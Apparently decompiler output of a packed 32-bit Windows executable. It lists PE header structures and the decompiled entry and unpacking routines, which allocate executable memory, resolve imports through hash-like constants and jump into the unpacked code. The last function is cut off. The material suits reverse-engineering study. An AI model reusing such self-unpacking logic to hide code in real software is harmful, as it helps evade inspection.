typedef unsigned char   undefined;

typedef unsigned long long    GUID;
typedef pointer32 ImageBaseOffset32;

typedef unsigned char    byte;
typedef unsigned int    dword;
typedef unsigned char    uchar;
typedef unsigned int    uint;
typedef unsigned long    ulong;
typedef unsigned char    undefined1;
typedef unsigned int    undefined4;
typedef unsigned long long    undefined8;
typedef unsigned short    ushort;
typedef unsigned short    wchar16;
typedef unsigned short    word;
typedef struct CLIENT_ID CLIENT_ID, *PCLIENT_ID;

struct CLIENT_ID {
    void *UniqueProcess;
    void *UniqueThread;
};

typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion;

typedef struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct;

struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct {
    dword OffsetToDirectory;
    dword DataIsDirectory;
};

union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion {
    dword OffsetToData;
    struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct;
};

typedef char CHAR;

typedef CHAR *LPCSTR;

typedef struct IMAGE_DOS_HEADER IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;

struct IMAGE_DOS_HEADER {
    char e_magic[2]; // Magic number
    word e_cblp; // Bytes of last page
    word e_cp; // Pages in file
    word e_crlc; // Relocations
    word e_cparhdr; // Size of header in paragraphs
    word e_minalloc; // Minimum extra paragraphs needed
    word e_maxalloc; // Maximum extra paragraphs needed
    word e_ss; // Initial (relative) SS value
    word e_sp; // Initial SP value
    word e_csum; // Checksum
    word e_ip; // Initial IP value
    word e_cs; // Initial (relative) CS value
    word e_lfarlc; // File address of relocation table
    word e_ovno; // Overlay number
    word e_res[4][4]; // Reserved words
    word e_oemid; // OEM identifier (for e_oeminfo)
    word e_oeminfo; // OEM information; e_oemid specific
    word e_res2[10][10]; // Reserved words
    dword e_lfanew; // File address of new exe header
    byte e_program[64]; // Actual DOS program
};

typedef struct HINSTANCE__ HINSTANCE__, *PHINSTANCE__;

struct HINSTANCE__ {
    int unused;
};

typedef ulong DWORD;

typedef DWORD *PDWORD;

typedef int BOOL;

typedef int (*FARPROC)(void);

typedef struct HINSTANCE__ *HINSTANCE;

typedef void *LPVOID;

typedef HINSTANCE HMODULE;

typedef ulong ULONG_PTR;

typedef ULONG_PTR SIZE_T;

typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY IMAGE_RESOURCE_DIRECTORY_ENTRY, *PIMAGE_RESOURCE_DIRECTORY_ENTRY;

typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion;

typedef struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct;

struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct {
    dword NameOffset;
    dword NameIsString;
};

union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion {
    struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct;
    dword Name;
    word Id;
};

union IMAGE_RESOURCE_DIRECTORY_ENTRY {
    union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion NameUnion;
    union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion DirectoryUnion;
};

typedef struct IMAGE_OPTIONAL_HEADER32 IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;

typedef struct IMAGE_DATA_DIRECTORY IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;

struct IMAGE_DATA_DIRECTORY {
    ImageBaseOffset32 VirtualAddress;
    dword Size;
};

struct IMAGE_OPTIONAL_HEADER32 {
    word Magic;
    byte MajorLinkerVersion;
    byte MinorLinkerVersion;
    dword SizeOfCode;
    dword SizeOfInitializedData;
    dword SizeOfUninitializedData;
    ImageBaseOffset32 AddressOfEntryPoint;
    ImageBaseOffset32 BaseOfCode;
    ImageBaseOffset32 BaseOfData;
    pointer32 ImageBase;
    dword SectionAlignment;
    dword FileAlignment;
    word MajorOperatingSystemVersion;
    word MinorOperatingSystemVersion;
    word MajorImageVersion;
    word MinorImageVersion;
    word MajorSubsystemVersion;
    word MinorSubsystemVersion;
    dword Win32VersionValue;
    dword SizeOfImage;
    dword SizeOfHeaders;
    dword CheckSum;
    word Subsystem;
    word DllCharacteristics;
    dword SizeOfStackReserve;
    dword SizeOfStackCommit;
    dword SizeOfHeapReserve;
    dword SizeOfHeapCommit;
    dword LoaderFlags;
    dword NumberOfRvaAndSizes;
    struct IMAGE_DATA_DIRECTORY DataDirectory[16];
};

typedef struct IMAGE_SECTION_HEADER IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;

typedef union Misc Misc, *PMisc;

typedef enum SectionFlags {
    IMAGE_SCN_TYPE_NO_PAD=8,
    IMAGE_SCN_RESERVED_0001=16,
    IMAGE_SCN_CNT_CODE=32,
    IMAGE_SCN_CNT_INITIALIZED_DATA=64,
    IMAGE_SCN_CNT_UNINITIALIZED_DATA=128,
    IMAGE_SCN_LNK_OTHER=256,
    IMAGE_SCN_LNK_INFO=512,
    IMAGE_SCN_RESERVED_0040=1024,
    IMAGE_SCN_LNK_REMOVE=2048,
    IMAGE_SCN_LNK_COMDAT=4096,
    IMAGE_SCN_GPREL=32768,
    IMAGE_SCN_MEM_16BIT=131072,
    IMAGE_SCN_MEM_PURGEABLE=131072,
    IMAGE_SCN_MEM_LOCKED=262144,
    IMAGE_SCN_MEM_PRELOAD=524288,
    IMAGE_SCN_ALIGN_1BYTES=1048576,
    IMAGE_SCN_ALIGN_2BYTES=2097152,
    IMAGE_SCN_ALIGN_4BYTES=3145728,
    IMAGE_SCN_ALIGN_8BYTES=4194304,
    IMAGE_SCN_ALIGN_16BYTES=5242880,
    IMAGE_SCN_ALIGN_32BYTES=6291456,
    IMAGE_SCN_ALIGN_64BYTES=7340032,
    IMAGE_SCN_ALIGN_128BYTES=8388608,
    IMAGE_SCN_ALIGN_256BYTES=9437184,
    IMAGE_SCN_ALIGN_512BYTES=10485760,
    IMAGE_SCN_ALIGN_1024BYTES=11534336,
    IMAGE_SCN_ALIGN_2048BYTES=12582912,
    IMAGE_SCN_ALIGN_4096BYTES=13631488,
    IMAGE_SCN_ALIGN_8192BYTES=14680064,
    IMAGE_SCN_LNK_NRELOC_OVFL=16777216,
    IMAGE_SCN_MEM_DISCARDABLE=33554432,
    IMAGE_SCN_MEM_NOT_CACHED=67108864,
    IMAGE_SCN_MEM_NOT_PAGED=134217728,
    IMAGE_SCN_MEM_SHARED=268435456,
    IMAGE_SCN_MEM_EXECUTE=536870912,
    IMAGE_SCN_MEM_READ=1073741824,
    IMAGE_SCN_MEM_WRITE=2147483648
} SectionFlags;

union Misc {
    dword PhysicalAddress;
    dword VirtualSize;
};

struct IMAGE_SECTION_HEADER {
    char Name[8];
    union Misc Misc;
    ImageBaseOffset32 VirtualAddress;
    dword SizeOfRawData;
    dword PointerToRawData;
    dword PointerToRelocations;
    dword PointerToLinenumbers;
    word NumberOfRelocations;
    word NumberOfLinenumbers;
    enum SectionFlags Characteristics;
};

typedef struct IMAGE_RESOURCE_DIR_STRING_U_8 IMAGE_RESOURCE_DIR_STRING_U_8, *PIMAGE_RESOURCE_DIR_STRING_U_8;

struct IMAGE_RESOURCE_DIR_STRING_U_8 {
    word Length;
    wchar16 NameString[4];
};

typedef struct IMAGE_RESOURCE_DIR_STRING_U_6 IMAGE_RESOURCE_DIR_STRING_U_6, *PIMAGE_RESOURCE_DIR_STRING_U_6;

struct IMAGE_RESOURCE_DIR_STRING_U_6 {
    word Length;
    wchar16 NameString[3];
};

typedef struct IMAGE_RESOURCE_DIR_STRING_U_4 IMAGE_RESOURCE_DIR_STRING_U_4, *PIMAGE_RESOURCE_DIR_STRING_U_4;

struct IMAGE_RESOURCE_DIR_STRING_U_4 {
    word Length;
    wchar16 NameString[2];
};

typedef struct IMAGE_RESOURCE_DATA_ENTRY IMAGE_RESOURCE_DATA_ENTRY, *PIMAGE_RESOURCE_DATA_ENTRY;

struct IMAGE_RESOURCE_DATA_ENTRY {
    dword OffsetToData;
    dword Size;
    dword CodePage;
    dword Reserved;
};

typedef struct IMAGE_RESOURCE_DIRECTORY IMAGE_RESOURCE_DIRECTORY, *PIMAGE_RESOURCE_DIRECTORY;

struct IMAGE_RESOURCE_DIRECTORY {
    dword Characteristics;
    dword TimeDateStamp;
    word MajorVersion;
    word MinorVersion;
    word NumberOfNamedEntries;
    word NumberOfIdEntries;
};

typedef struct IMAGE_FILE_HEADER IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;

struct IMAGE_FILE_HEADER {
    word Machine; // 332
    word NumberOfSections;
    dword TimeDateStamp;
    dword PointerToSymbolTable;
    dword NumberOfSymbols;
    word SizeOfOptionalHeader;
    word Characteristics;
};

typedef struct IMAGE_NT_HEADERS32 IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;

struct IMAGE_NT_HEADERS32 {
    char Signature[4];
    struct IMAGE_FILE_HEADER FileHeader;
    struct IMAGE_OPTIONAL_HEADER32 OptionalHeader;
};




// WARNING: Control flow encountered bad instruction data

undefined8 __fastcall entry(undefined4 param_1,undefined4 param_2)

{
  bool bVar1;
  undefined4 in_EAX;
  LPVOID pvVar2;
  int iVar3;
  uint uVar4;
  char *pcVar5;
  uint *puVar6;
  undefined4 uVar7;
  undefined4 extraout_ECX;
  undefined4 extraout_ECX_00;
  undefined4 extraout_ECX_01;
  undefined4 extraout_ECX_02;
  undefined4 extraout_ECX_03;
  undefined4 extraout_ECX_04;
  undefined4 extraout_EDX;
  int extraout_EDX_00;
  undefined4 uVar8;
  undefined4 extraout_EDX_01;
  undefined *unaff_EBX;
  code *pcVar9;
  undefined4 unaff_EBP;
  undefined4 unaff_ESI;
  undefined **ppuVar10;
  int *piVar11;
  uint *puVar12;
  undefined4 unaff_EDI;
  int iVar13;
  byte in_CF;
  byte in_PF;
  byte in_AF;
  byte in_ZF;
  char in_SF;
  undefined8 uVar14;
  undefined8 uVar15;
  undefined4 in_stack_00000008;
  undefined uVar16;
  int iVar17;
  int iVar18;
  undefined uVar19;
  undefined uVar20;
  undefined uVar21;
  undefined uVar22;
  undefined *puVar23;
  undefined uVar24;
  undefined uVar25;
  int *piVar26;
  undefined uVar27;
  code *pcVar28;
  undefined4 uVar29;
  undefined4 uVar30;
  undefined *puVar31;
  byte bVar32;
  
  bVar32 = in_SF * -0x80 | (in_ZF & 1) * '@' | (in_AF & 1) * '\x10' | (in_PF & 1) * '\x04' |
           in_CF & 1;
  puVar31 = &stack0xfffffffc;
  FUN_00480eb8(unaff_EDI,unaff_ESI,unaff_EBP,&stack0xfffffffc,unaff_EBX,param_2,param_1,in_EAX);
  iVar3 = 0x480ed1;
  ppuVar10 = &PTR_DAT_0048351c;
  pcVar9 = FUN_0048121f;
  FUN_0048117c(in_EAX,param_1,(char)unaff_ESI,(char)unaff_EBP,(char)puVar31,(char)&stack0x00000004,
               (char)param_2,(char)param_1,(char)in_EAX,bVar32,in_stack_00000008);
  pvVar2 = VirtualAlloc((LPVOID)0x0,0xc2000,0x1000,0x40);
  uVar7 = extraout_ECX;
  uVar8 = extraout_EDX;
  DAT_004829c2 = pvVar2;
  for (iVar13 = 0; puVar23 = &stack0xffffffe4, *(int *)(iVar13 + (int)ppuVar10) != 0;
      iVar13 = iVar13 + 8) {
    (*pcVar9)(*(undefined4 *)(iVar13 + 4 + (int)ppuVar10),*(undefined4 *)(iVar13 + (int)ppuVar10),
              *(undefined4 *)(iVar3 + 0x1af1));
  }
  piVar11 = (int *)(iVar13 + 4 + (int)ppuVar10);
  if (*(int *)(iVar3 + 0x2362) == 1) {
    bVar1 = false;
    iVar13 = 0;
    piVar26 = piVar11;
    iVar17 = iVar3;
    while (!bVar1) {
      iVar18 = piVar11[1];
      uVar29 = FUN_00481164((char)iVar13,(char)piVar26,(char)iVar17,(char)puVar23,(char)pcVar9,
                            (char)uVar8,(char)uVar7,(char)pvVar2,(char)unaff_ESI,(char)unaff_EBP,
                            in_stack_00000008);
      if (extraout_EDX_00 == 0) {
        uVar30 = 0x20;
      }
      else {
        uVar30 = 0x40;
      }
      (**(code **)(iVar3 + 0xb01))(iVar18,uVar29,uVar30,iVar3 + 0x20b1);
      piVar11 = piVar11 + 3;
      if (*piVar11 == -1) {
        bVar1 = true;
      }
    }
    piVar11 = piVar11 + 1;
    iVar3 = iVar17;
  }
  else {
    piVar11 = piVar11 + 2;
  }
  *(int *)(iVar3 + 0x1b11) = *piVar11;
  FUN_00482904(uVar7,uVar8);
  uVar30 = 0x40;
  uVar7 = 0;
  uVar29 = 0xbbc;
  pcVar28 = (code *)0x0;
  uVar14 = (**(code **)(iVar3 + 0xaf9))();
  *(int *)(iVar3 + 0x2647) = (int)uVar14;
  puVar23 = &stack0xffffffd4;
  iVar17 = *(int *)(iVar3 + 0x1af1);
  uVar8 = extraout_ECX_00;
  (*pcVar28)(*(undefined4 *)(iVar3 + 0x2647),piVar11 + 2,iVar17,iVar13,piVar11 + 2,iVar3,
             &stack0xffffffd4,pcVar28);
  uVar15 = FUN_00482237(puVar23,iVar3);
  if ((*(int *)(iVar17 + 0x2162) != 0) && (*(int *)(iVar17 + 0x209d) != 0)) {
    FUN_004824f2(extraout_ECX_01,(int)((ulonglong)uVar15 >> 0x20));
    FUN_0048238f();
  }
  puVar12 = *(uint **)(iVar17 + 0x2647);
  for (puVar6 = puVar12; *(char *)puVar6 != '\x01'; puVar6 = (uint *)((int)puVar6 + 1)) {
  }
  piVar11 = *(int **)((int)puVar6 + 1);
  iVar3 = FUN_00481148((char)((ulonglong)uVar14 >> 0x20),(char)uVar8,(char)uVar14,(char)uVar29,
                       (char)uVar7,(char)uVar30,(char)pcVar9,(char)unaff_ESI,(char)unaff_EBP,puVar31
                      );
  *(int *)(iVar17 + 0x2643) = iVar3 + 4;
  while( true ) {
    uVar27 = (undefined)uVar8;
    uVar25 = (undefined)((ulonglong)uVar14 >> 0x20);
    if (*(char *)puVar12 == '\x01') {
      uVar24 = 0;
      uVar22 = 0xbc;
      uVar21 = (undefined)*(undefined4 *)(iVar17 + 0x2647);
      (**(code **)(iVar17 + 0xafd))();
      uVar20 = 0;
      uVar19 = 0;
      uVar16 = (undefined)*(undefined4 *)(iVar17 + 0x1af1);
      (**(code **)(iVar17 + 0xafd))();
      FUN_004811ab(extraout_ECX_02,extraout_EDX_01,uVar16,uVar19,uVar20,uVar21,uVar22,uVar24,uVar25,
                   uVar27,uVar29);
                    // WARNING: Bad instruction - Truncating control flow here
      halt_baddata();
    }
    FUN_00481a43();
    iVar3 = (**(code **)(iVar17 + 0xb05))(puVar12);
    if (iVar3 == 0) break;
    *(int *)(iVar17 + 0x263f) = iVar3;
    puVar6 = puVar12;
    while (*(char *)puVar6 != '\0') {
      do {
        if ((**(uint **)(iVar17 + 0x2643) & 0x80000000) == 0) {
          uVar4 = *(uint *)(iVar17 + 0x2643);
        }
        else {
          uVar4 = **(uint **)(iVar17 + 0x2643) ^ 0x80000000;
          *(uint *)(iVar17 + 0x1b09) = uVar4;
          **(undefined4 **)(iVar17 + 0x2643) = 0x202020;
        }
        iVar3 = (**(code **)(iVar17 + 0xaf5))(*(undefined4 *)(iVar17 + 0x263f),uVar4);
        if (iVar3 == 0) {
          if (*(int *)(iVar17 + 0x1b09) == 0) {
            iVar3 = 1;
          }
          else {
            iVar3 = 2;
          }
          goto LAB_00481a80;
        }
        *(undefined4 *)(iVar17 + 0x1b09) = 0;
        *piVar11 = iVar3;
        piVar11 = piVar11 + 1;
        for (pcVar5 = *(char **)(iVar17 + 0x2643); *pcVar5 != '\0'; pcVar5 = pcVar5 + 1) {
        }
        puVar6 = (uint *)(pcVar5 + 1);
        *(uint **)(iVar17 + 0x2643) = puVar6;
      } while ((*puVar6 & 0x80000000) != 0);
    }
    for (; *(char *)puVar12 != '\0'; puVar12 = (uint *)((int)puVar12 + 1)) {
    }
    puVar12 = (uint *)((int)puVar12 + 1);
    piVar11 = *(int **)((int)puVar6 + 1);
    iVar3 = FUN_00481148((char)((ulonglong)uVar14 >> 0x20),(char)uVar8,(char)uVar14,(char)uVar29,
                         (char)uVar7,(char)uVar30,(char)pcVar9,(char)unaff_ESI,(char)unaff_EBP,
                         puVar31);
    *(int *)(iVar17 + 0x2643) = iVar3 + 4;
  }
  iVar3 = 0;
LAB_00481a80:
  uVar7 = (**(code **)(iVar17 + 0xaf9))(0,0x1000,0x1000,0x40);
  *(undefined4 *)(iVar17 + 0x2647) = uVar7;
  iVar13 = iVar17 + 0x1b45;
  uVar14 = (**(code **)(iVar17 + 0xaf1))();
  iVar18 = (int)uVar14;
  uVar7 = extraout_ECX_03;
  if (*(int *)(iVar17 + 0x1b35) == -0x544397f3) {
    uVar15 = FUN_00482971(extraout_ECX_03,(int)((ulonglong)uVar14 >> 0x20),iVar18,
                          *(int *)(iVar17 + 0x1b35));
    uVar14 = CONCAT44((int)((ulonglong)uVar15 >> 0x20),iVar18);
    *(int *)(iVar17 + 0x1b35) = (int)uVar15;
    uVar7 = extraout_ECX_04;
  }
  if (*(int *)(iVar17 + 0x1b41) == -0x15c50f29) {
    uVar14 = FUN_00482971(uVar7,(int)((ulonglong)uVar14 >> 0x20),(int)uVar14,
                          *(int *)(iVar17 + 0x1b41));
    *(int *)(iVar17 + 0x1b41) = (int)uVar14;
  }
  if (iVar3 == 0) {
    (**(code **)(iVar17 + 0x1b41))(*(undefined4 *)(iVar17 + 0x2647),iVar17 + 0x1b7a,puVar12);
  }
  else if (iVar3 == 1) {
    (**(code **)(iVar17 + 0x1b41))
              (*(undefined4 *)(iVar17 + 0x2647),iVar17 + 0x1ba2,*(undefined4 *)(iVar17 + 0x2643),
               puVar12);
  }
  else if (iVar3 == 2) {
    (**(code **)(iVar17 + 0x1b41))
              (*(undefined4 *)(iVar17 + 0x2647),iVar17 + 0x1bdb,*(undefined4 *)(iVar17 + 0x1b09),
               puVar12);
  }
  iVar3 = iVar17 + 0x1b50;
  (**(code **)(iVar17 + 0x1b35))(0,*(undefined4 *)(iVar17 + 0x2647),iVar3,0x30);
  (**(code **)(iVar17 + 0xafd))(*(undefined4 *)(iVar17 + 0x2647),0x1000,0x4000);
  return CONCAT44(iVar3,iVar13);
}



// WARNING: Control flow encountered bad instruction data

undefined8 __fastcall FUN_00480eaf(undefined4 param_1,undefined4 param_2)

{
  bool bVar1;
  undefined4 in_EAX;
  LPVOID pvVar2;
  int iVar3;
  uint uVar4;
  char *pcVar5;
  uint *puVar6;
  undefined4 uVar7;
  undefined4 extraout_ECX;
  undefined4 extraout_ECX_00;
  undefined4 extraout_ECX_01;
  undefined4 extraout_ECX_02;
  undefined4 extraout_ECX_03;
  undefined4 extraout_ECX_04;
  undefined4 extraout_EDX;
  int extraout_EDX_00;
  undefined4 uVar8;
  undefined4 extraout_EDX_01;
  undefined *unaff_EBX;
  code *pcVar9;
  undefined4 unaff_EBP;
  undefined4 unaff_ESI;
  undefined **ppuVar10;
  int *piVar11;
  uint *puVar12;
  undefined4 unaff_EDI;
  int iVar13;
  byte in_CF;
  byte in_PF;
  byte in_AF;
  byte in_ZF;
  char in_SF;
  undefined8 uVar14;
  undefined8 uVar15;
  undefined4 in_stack_00000008;
  undefined uVar16;
  int iVar17;
  int iVar18;
  undefined uVar19;
  undefined uVar20;
  undefined uVar21;
  undefined uVar22;
  undefined *puVar23;
  undefined uVar24;
  undefined uVar25;
  int *piVar26;
  undefined uVar27;
  code *pcVar28;
  undefined4 uVar29;
  undefined4 uVar30;
  undefined *puVar31;
  byte bVar32;
  
  bVar32 = in_SF * -0x80 | (in_ZF & 1) * '@' | (in_AF & 1) * '\x10' | (in_PF & 1) * '\x04' |
           in_CF & 1;
  puVar31 = &stack0xfffffffc;
  FUN_00480eb8(unaff_EDI,unaff_ESI,unaff_EBP,&stack0xfffffffc,unaff_EBX,param_2,param_1,in_EAX);
  iVar3 = 0x480ed1;
  ppuVar10 = &PTR_DAT_0048351c;
  pcVar9 = FUN_0048121f;
  FUN_0048117c(in_EAX,param_1,(char)unaff_ESI,(char)unaff_EBP,(char)puVar31,(char)&stack0x00000004,
               (char)param_2,(char)param_1,(char)in_EAX,bVar32,in_stack_00000008);
  pvVar2 = VirtualAlloc((LPVOID)0x0,0xc2000,0x1000,0x40);
  uVar7 = extraout_ECX;
  uVar8 = extraout_EDX;
  DAT_004829c2 = pvVar2;
  for (iVar13 = 0; puVar23 = &stack0xffffffe4, *(int *)(iVar13 + (int)ppuVar10) != 0;
      iVar13 = iVar13 + 8) {
    (*pcVar9)(*(undefined4 *)(iVar13 + 4 + (int)ppuVar10),*(undefined4 *)(iVar13 + (int)ppuVar10),
              *(undefined4 *)(iVar3 + 0x1af1));
  }
  piVar11 = (int *)(iVar13 + 4 + (int)ppuVar10);
  if (*(int *)(iVar3 + 0x2362) == 1) {
    bVar1 = false;
    iVar13 = 0;
    piVar26 = piVar11;
    iVar17 = iVar3;
    while (!bVar1) {
      iVar18 = piVar11[1];
      uVar29 = FUN_00481164((char)iVar13,(char)piVar26,(char)iVar17,(char)puVar23,(char)pcVar9,
                            (char)uVar8,(char)uVar7,(char)pvVar2,(char)unaff_ESI,(char)unaff_EBP,
                            in_stack_00000008);
      if (extraout_EDX_00 == 0) {
        uVar30 = 0x20;
      }
      else {
        uVar30 = 0x40;
      }
      (**(code **)(iVar3 + 0xb01))(iVar18,uVar29,uVar30,iVar3 + 0x20b1);
      piVar11 = piVar11 + 3;
      if (*piVar11 == -1) {
        bVar1 = true;
      }
    }
    piVar11 = piVar11 + 1;
    iVar3 = iVar17;
  }
  else {
    piVar11 = piVar11 + 2;
  }
  *(int *)(iVar3 + 0x1b11) = *piVar11;
  FUN_00482904(uVar7,uVar8);
  uVar30 = 0x40;
  uVar7 = 0;
  uVar29 = 0xbbc;
  pcVar28 = (code *)0x0;
  uVar14 = (**(code **)(iVar3 + 0xaf9))();
  *(int *)(iVar3 + 0x2647) = (int)uVar14;
  puVar23 = &stack0xffffffd4;
  iVar17 = *(int *)(iVar3 + 0x1af1);
  uVar8 = extraout_ECX_00;
  (*pcVar28)(*(undefined4 *)(iVar3 + 0x2647),piVar11 + 2,iVar17,iVar13,piVar11 + 2,iVar3,
             &stack0xffffffd4,pcVar28);
  uVar15 = FUN_00482237(puVar23,iVar3);
  if ((*(int *)(iVar17 + 0x2162) != 0) && (*(int *)(iVar17 + 0x209d) != 0)) {
    FUN_004824f2(extraout_ECX_01,(int)((ulonglong)uVar15 >> 0x20));
    FUN_0048238f();
  }
  puVar12 = *(uint **)(iVar17 + 0x2647);
  for (puVar6 = puVar12; *(char *)puVar6 != '\x01'; puVar6 = (uint *)((int)puVar6 + 1)) {
  }
  piVar11 = *(int **)((int)puVar6 + 1);
  iVar3 = FUN_00481148((char)((ulonglong)uVar14 >> 0x20),(char)uVar8,(char)uVar14,(char)uVar29,
                       (char)uVar7,(char)uVar30,(char)pcVar9,(char)unaff_ESI,(char)unaff_EBP,puVar31
                      );
  *(int *)(iVar17 + 0x2643) = iVar3 + 4;
  while( true ) {
    uVar27 = (undefined)uVar8;
    uVar25 = (undefined)((ulonglong)uVar14 >> 0x20);
    if (*(char *)puVar12 == '\x01') {
      uVar24 = 0;
      uVar22 = 0xbc;
      uVar21 = (undefined)*(undefined4 *)(iVar17 + 0x2647);
      (**(code **)(iVar17 + 0xafd))();
      uVar20 = 0;
      uVar19 = 0;
      uVar16 = (undefined)*(undefined4 *)(iVar17 + 0x1af1);
      (**(code **)(iVar17 + 0xafd))();
      FUN_004811ab(extraout_ECX_02,extraout_EDX_01,uVar16,uVar19,uVar20,uVar21,uVar22,uVar24,uVar25,
                   uVar27,uVar29);
                    // WARNING: Bad instruction - Truncating control flow here
      halt_baddata();
    }
    FUN_00481a43();
    iVar3 = (**(code **)(iVar17 + 0xb05))(puVar12);
    if (iVar3 == 0) break;
    *(int *)(iVar17 + 0x263f) = iVar3;
    puVar6 = puVar12;
    while (*(char *)puVar6 != '\0') {
      do {
        if ((**(uint **)(iVar17 + 0x2643) & 0x80000000) == 0) {
          uVar4 = *(uint *)(iVar17 + 0x2643);
        }
        else {
          uVar4 = **(uint **)(iVar17 + 0x2643) ^ 0x80000000;
          *(uint *)(iVar17 + 0x1b09) = uVar4;
          **(undefined4 **)(iVar17 + 0x2643) = 0x202020;
        }
        iVar3 = (**(code **)(iVar17 + 0xaf5))(*(undefined4 *)(iVar17 + 0x263f),uVar4);
        if (iVar3 == 0) {
          if (*(int *)(iVar17 + 0x1b09) == 0) {
            iVar3 = 1;
          }
          else {
            iVar3 = 2;
          }
          goto LAB_00481a80;
        }
        *(undefined4 *)(iVar17 + 0x1b09) = 0;
        *piVar11 = iVar3;
        piVar11 = piVar11 + 1;
        for (pcVar5 = *(char **)(iVar17 + 0x2643); *pcVar5 != '\0'; pcVar5 = pcVar5 + 1) {
        }
        puVar6 = (uint *)(pcVar5 + 1);
        *(uint **)(iVar17 + 0x2643) = puVar6;
      } while ((*puVar6 & 0x80000000) != 0);
    }
    for (; *(char *)puVar12 != '\0'; puVar12 = (uint *)((int)puVar12 + 1)) {
    }
    puVar12 = (uint *)((int)puVar12 + 1);
    piVar11 = *(int **)((int)puVar6 + 1);
    iVar3 = FUN_00481148((char)((ulonglong)uVar14 >> 0x20),(char)uVar8,(char)uVar14,(char)uVar29,
                         (char)uVar7,(char)uVar30,(char)pcVar9,(char)unaff_ESI,(char)unaff_EBP,
                         puVar31);
    *(int *)(iVar17 + 0x2643) = iVar3 + 4;
  }
  iVar3 = 0;
LAB_00481a80:
  uVar7 = (**(code **)(iVar17 + 0xaf9))(0,0x1000,0x1000,0x40);
  *(undefined4 *)(iVar17 + 0x2647) = uVar7;
  iVar13 = iVar17 + 0x1b45;
  uVar14 = (**(code **)(iVar17 + 0xaf1))();
  iVar18 = (int)uVar14;
  uVar7 = extraout_ECX_03;
  if (*(int *)(iVar17 + 0x1b35) == -0x544397f3) {
    uVar15 = FUN_00482971(extraout_ECX_03,(int)((ulonglong)uVar14 >> 0x20),iVar18,
                          *(int *)(iVar17 + 0x1b35));
    uVar14 = CONCAT44((int)((ulonglong)uVar15 >> 0x20),iVar18);
    *(int *)(iVar17 + 0x1b35) = (int)uVar15;
    uVar7 = extraout_ECX_04;
  }
  if (*(int *)(iVar17 + 0x1b41) == -0x15c50f29) {
    uVar14 = FUN_00482971(uVar7,(int)((ulonglong)uVar14 >> 0x20),(int)uVar14,
                          *(int *)(iVar17 + 0x1b41));
    *(int *)(iVar17 + 0x1b41) = (int)uVar14;
  }
  if (iVar3 == 0) {
    (**(code **)(iVar17 + 0x1b41))(*(undefined4 *)(iVar17 + 0x2647),iVar17 + 0x1b7a,puVar12);
  }
  else if (iVar3 == 1) {
    (**(code **)(iVar17 + 0x1b41))
              (*(undefined4 *)(iVar17 + 0x2647),iVar17 + 0x1ba2,*(undefined4 *)(iVar17 + 0x2643),
               puVar12);
  }
  else if (iVar3 == 2) {
    (**(code **)(iVar17 + 0x1b41))
              (*(undefined4 *)(iVar17 + 0x2647),iVar17 + 0x1bdb,*(undefined4 *)(iVar17 + 0x1b09),
               puVar12);
  }
  iVar3 = iVar17 + 0x1b50;
  (**(code **)(iVar17 + 0x1b35))(0,*(undefined4 *)(iVar17 + 0x2647),iVar3,0x30);
  (**(code **)(iVar17 + 0xafd))(*(undefined4 *)(iVar17 + 0x2647),0x1000,0x4000);
  return CONCAT44(iVar3,iVar13);
}



// WARNING: Control flow encountered bad instruction data

undefined8 __cdecl
FUN_00480eb8(undefined4 param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4,
            undefined *param_5,undefined *param_6,undefined4 param_7,undefined4 param_8)

{
  bool bVar1;
  undefined4 uVar2;
  LPVOID pvVar3;
  int iVar4;
  uint uVar5;
  char *pcVar6;
  uint *puVar7;
  undefined4 uVar8;
  undefined4 extraout_ECX;
  undefined4 extraout_ECX_00;
  undefined4 extraout_ECX_01;
  undefined4 extraout_ECX_02;
  undefined4 extraout_ECX_03;
  undefined4 extraout_ECX_04;
  undefined4 extraout_EDX;
  int extraout_EDX_00;
  undefined4 uVar9;
  undefined4 extraout_EDX_01;
  code *pcVar10;
  undefined **ppuVar11;
  int *piVar12;
  uint *puVar13;
  int iVar14;
  undefined8 uVar15;
  undefined8 uVar16;
  undefined4 uVar17;
  undefined4 in_stack_0000002c;
  undefined uVar18;
  int iVar19;
  int iVar20;
  undefined uVar21;
  undefined uVar22;
  undefined uVar23;
  undefined uVar24;
  undefined *puVar25;
  undefined uVar26;
  undefined uVar27;
  int *piVar28;
  undefined uVar29;
  undefined4 *puVar30;
  code *pcVar31;
  undefined4 uVar32;
  
  uVar24 = (undefined)param_8;
  uVar2 = param_7;
  uVar32 = param_6;
  puVar25 = param_5;
  uVar17 = param_3;
  uVar8 = param_2;
  param_8 = param_7;
  param_7 = param_6;
  param_6 = param_5;
  param_4 = param_3;
  param_3 = param_2;
  param_2 = param_1;
  uVar9 = param_2;
  iVar4 = 0x480ed1;
  ppuVar11 = &PTR_DAT_0048351c;
